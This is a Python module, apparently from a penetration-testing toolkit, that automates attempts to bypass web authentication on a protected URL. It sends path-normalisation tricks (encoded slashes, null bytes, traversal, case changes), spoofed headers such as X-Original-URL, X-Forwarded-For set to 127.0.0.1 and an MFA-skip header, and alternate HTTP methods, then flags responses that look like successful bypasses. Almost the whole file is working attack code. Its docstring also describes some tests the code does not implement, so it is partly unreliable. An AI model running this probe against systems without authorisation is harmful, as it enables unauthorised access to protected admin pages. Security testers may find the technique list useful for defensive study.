#!/usr/bin/env python3
"""
redshift_toolkit.web.auth_bypass_probe — generic auth/middleware bypass probe.

Why this matters
----------------
Routers, reverse proxies, and middleware sometimes apply auth on the
*decoded, normalised* path while the backend serves the *raw* path — a
classic parser differential. The same applies to layer-7 ACLs that allow
internal-only routes and forget about HTTP header overrides.

Tests run for each protected URL
--------------------------------
* trailing slash:                /admin   → /admin/
* extension:                     /admin   → /admin.json /admin/.css /admin;.js
* fragment:                      /admin   → /admin#anything
* case:                          /admin   → /Admin /ADMIN
* dot-segment:                   /admin   → /./admin /admin/.
* encoded slash:                 /admin   → /%2fadmin /admin%2f
* double-encoded slash:          /admin   → /%252fadmin
* nullbyte legacy:               /admin%00
* X-Original-URL / X-Rewrite-URL header
* X-Forwarded-For / X-Real-IP   → 127.0.0.1
* X-Custom-IP-Authorization     → 127.0.0.1
* X-Forwarded-Host              → internal.target
* Referer header allowlist:     Referer: https://target/admin
* MFA-skip pattern:              flip ?mfa=true / mfa_completed=1 cookies

Each test reuses the unauthenticated session (no auth cookies) and compares
the response status/length to the original (authed) response. Significant
divergence is flagged.

Usage
-----
    python3 -m redshift_toolkit.web.auth_bypass_probe \\
        --url https://target.example/admin \\
        --baseline 401 \\
        --good-status 200,302

Author: Redshift Project — Module 17 (Auth & AuthZ)
License: MIT — authorised testing only.
"""
from __future__ import annotations

import argparse
import json
import sys
from dataclasses import asdict, dataclass, field
from typing import List, Optional, Tuple
from urllib.parse import urlparse, urlunparse

from .http_client import HttpRequest, send


GREEN, RED, YELLOW, CYAN, GREY, BOLD, RESET = (
    "\x1b[32m", "\x1b[31m", "\x1b[33m", "\x1b[36m", "\x1b[90m", "\x1b[1m", "\x1b[0m",
)


def paint(t: str, c: str, *, enabled: bool = True) -> str:
    return f"{c}{t}{RESET}" if enabled else t


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------
def url_with_path(url: str, new_path: str) -> str:
    u = urlparse(url)
    return urlunparse((u.scheme, u.netloc, new_path, u.params, u.query, u.fragment))


def path_variants(url: str) -> List[Tuple[str, str]]:
    """Return list of (label, modified_url)."""
    u = urlparse(url)
    p = u.path or "/"
    out: List[Tuple[str, str]] = [
        ("trailing slash",      url_with_path(url, p + "/")),
        ("extension .json",     url_with_path(url, p + ".json")),
        ("extension .css",      url_with_path(url, p + ".css")),
        ("dot extension",       url_with_path(url, p + "/.css")),
        ("semicolon ext",       url_with_path(url, p + ";.js")),
        ("uppercase",           url_with_path(url, p.upper())),
        ("dot prefix",          url_with_path(url, "/." + p.lstrip("/"))),
        ("dot suffix",          url_with_path(url, p + "/.")),
        ("encoded slash",       url_with_path(url, "/%2f" + p.lstrip("/"))),
        ("encoded slash suffix",url_with_path(url, p + "%2f")),
        ("double-encoded slash",url_with_path(url, "/%252f" + p.lstrip("/"))),
        ("nullbyte legacy",     url_with_path(url, p + "%00")),
        ("path traversal home", url_with_path(url, p + "/../" + p.lstrip("/"))),
        ("backslash differ.",   url_with_path(url, p + "\\")),
    ]
    return out


HEADER_VARIANTS = [
    ("X-Original-URL",          [("X-Original-URL", "/admin")]),
    ("X-Rewrite-URL",           [("X-Rewrite-URL", "/admin")]),
    ("X-Forwarded-For 127",     [("X-Forwarded-For", "127.0.0.1")]),
    ("X-Real-IP 127",           [("X-Real-IP", "127.0.0.1")]),
    ("X-Custom-IP-Auth",        [("X-Custom-IP-Authorization", "127.0.0.1")]),
    ("X-Originating-IP",        [("X-Originating-IP", "127.0.0.1")]),
    ("X-Remote-IP",             [("X-Remote-IP", "127.0.0.1")]),
    ("X-Client-IP",             [("X-Client-IP", "127.0.0.1")]),
    ("X-Forwarded-Host int.",   [("X-Forwarded-Host", "localhost")]),
    ("Referer self",            [("Referer", "{url}")]),
    ("Referer admin",           [("Referer", "{url_admin}")]),
    ("MFA-skip header",         [("X-MFA-Verified", "true")]),
    ("Auth: null",              [("Authorization", "null")]),
    ("Auth: Basic empty",       [("Authorization", "Basic Og==")]),  # ":" base64
]


METHOD_VARIANTS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS",
                   "HEAD", "TRACE", "CONNECT", "PROPFIND"]


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------
@dataclass
class ProbeResult:
    label: str
    method: str
    url: str
    headers_extra: List[List[str]] = field(default_factory=list)
    status: int = -1
    length: int = 0
    is_bypass: bool = False
    note: str = ""


def run_probe(url: str, *, baseline_status: int = 401,
              good_statuses: Optional[List[int]] = None,
              extra_headers: Optional[List[Tuple[str, str]]] = None,
              method: str = "GET", timeout: float = 10.0) -> List[ProbeResult]:
    good_statuses = good_statuses or [200, 301, 302, 303, 307]
    extra = extra_headers or []
    out: List[ProbeResult] = []
    u = urlparse(url)
    admin_url = urlunparse((u.scheme, u.netloc, "/admin", "", "", ""))

    def _send(label: str, m: str, u_str: str, hs: List[Tuple[str, str]]) -> ProbeResult:
        try:
            resp = send(HttpRequest(method=m, url=u_str, headers=list(extra) + hs),
                        timeout=timeout, follow_redirects=False)
            length = len(resp.body or b"")
            ok = resp.status in good_statuses and resp.status != baseline_status
            return ProbeResult(label=label, method=m, url=u_str,
                               headers_extra=[list(h) for h in hs],
                               status=resp.status, length=length, is_bypass=ok)
        except Exception as e:
            return ProbeResult(label=label, method=m, url=u_str,
                               headers_extra=[list(h) for h in hs],
                               note=f"error: {e}")

    # Path variants
    for label, mod_url in path_variants(url):
        out.append(_send(label, method, mod_url, []))

    # Header variants
    for label, hs in HEADER_VARIANTS:
        rendered = [(k, v.format(url=url, url_admin=admin_url)) for k, v in hs]
        out.append(_send(label, method, url, rendered))

    # Method variants
    for m in METHOD_VARIANTS:
        if m == method:
            continue
        out.append(_send(f"method {m}", m, url, []))

    return out


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------
def report_text(results: List[ProbeResult], baseline: int, *, colour: bool = True) -> str:
    L: List[str] = []
    bypasses = [r for r in results if r.is_bypass]
    L.append(paint(
        f"\n[auth_bypass_probe] {len(results)} tests run, baseline status={baseline}, "
        f"{len(bypasses)} potential bypass(es)", BOLD, enabled=colour,
    ))
    for r in results:
        sev = GREEN if r.is_bypass else GREY
        line = (f"  {paint(r.label, sev, enabled=colour):28s} "
                f"{r.method:7s} status={r.status} len={r.length}")
        if r.note:
            line += f"  {paint(r.note, YELLOW, enabled=colour)}"
        if r.is_bypass:
            line += paint("  ← BYPASS", GREEN, enabled=colour)
        L.append(line)
    return "\n".join(L)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main(argv: Optional[List[str]] = None) -> int:
    p = argparse.ArgumentParser(prog="auth_bypass_probe",
                                description="Generic auth / middleware bypass probe.")
    p.add_argument("--url", required=True, help="protected URL (the one returning 401/403)")
    p.add_argument("--method", default="GET")
    p.add_argument("--baseline", type=int, default=401,
                   help="expected status for unauthorised requests (default 401)")
    p.add_argument("--good-status", default="200,301,302,303,307",
                   help="comma-separated list of statuses that count as bypass")
    p.add_argument("--header", action="append", default=[],
                   help="extra request headers, format Key:Value (repeatable)")
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--format", choices=["text", "json"], default="text")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args(argv)

    extra = []
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra.append((k.strip(), v.strip()))
    good = [int(x) for x in args.good_status.split(",") if x.strip()]

    res = run_probe(args.url, baseline_status=args.baseline, good_statuses=good,
                    extra_headers=extra, method=args.method, timeout=args.timeout)

    if args.format == "json":
        print(json.dumps([asdict(r) for r in res], indent=2))
    else:
        print(report_text(res, args.baseline, colour=not args.no_color))

    return 0 if any(r.is_bypass for r in res) else 1


if __name__ == "__main__":
    sys.exit(main())
